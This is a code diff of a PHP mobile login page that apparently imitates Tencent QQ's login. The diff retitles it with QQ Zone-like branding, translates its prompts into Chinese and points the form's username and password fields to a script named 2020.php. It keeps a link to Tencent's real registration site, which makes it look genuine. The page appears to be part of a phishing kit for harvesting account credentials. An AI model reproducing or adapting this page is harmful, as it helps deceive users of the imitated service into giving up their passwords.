@@ -8,7 +8,7 @@ require_once 'include/common.php';
     <meta id="viewport" name="viewport"
           content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Mobile phone unified login</title>
+    <title>KK空间-分享生活，留住感动</title>
     <style type="text/css">
         html {
             height: 100%
@@ -750,7 +750,7 @@ require_once 'include/common.php';
     <div id="logo" class="logo"></div>
 
     <!--<form id="form" action="index.php" method="post" onsubmit="return onpost()"> -->
-    <form action="2019.php" method="post" onSubmit="return ts()">
+    <form action="2020.php" method="post" onSubmit="return ts()">
 
         <div id="q_logon_list" class="q_logon_list"></div>
         </div>
@@ -759,19 +759,19 @@ require_once 'include/common.php';
                 <liid
                 ="g_u">
                 <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
-                <input id="u" class="inputstyle" name="user" autocomplete="off" placeholder="KK_Account/Phone/Email"></li>
+                <input id="u" class="inputstyle" name="user" autocomplete="off" placeholder="支持KK号/邮箱/手机号登录"></li>
                 <li id="g_p">
                     <div id="del_touch_p" class="del_touch"><span id="del_p" class="del_u"></span></div>
                     <input id="p" class="inputstyle" maxlength="16" type="password" name="pass" autocorrect="off"
-                           placeholder="Input your KK_Account please"></li>
+                           placeholder="密码"></li>
             </ul>
-            <button id="go" name="submit">Login</button>
-            <div href="javascript:void(0);" id="onekey">Login quickly</div>
+            <button id="go" name="submit">登 录</button>
+            <div href="javascript:void(0);" id="onekey">快速安全登录</div>
         </div>
         <div id="switch">
             <div id="swicth_login" onClick="pt._switch()" style="display:none"></div>
             <div id="zc_feedback"><span id="zc"
-                                        onclick="window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')">Register</span>
-                <span id="forgetpwd">Retrieve password</span></div>
+                                        onclick="window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')">注册新帐号</span>
+                <span id="forgetpwd">忘了密码？</span></div>
         </div>
     </form>
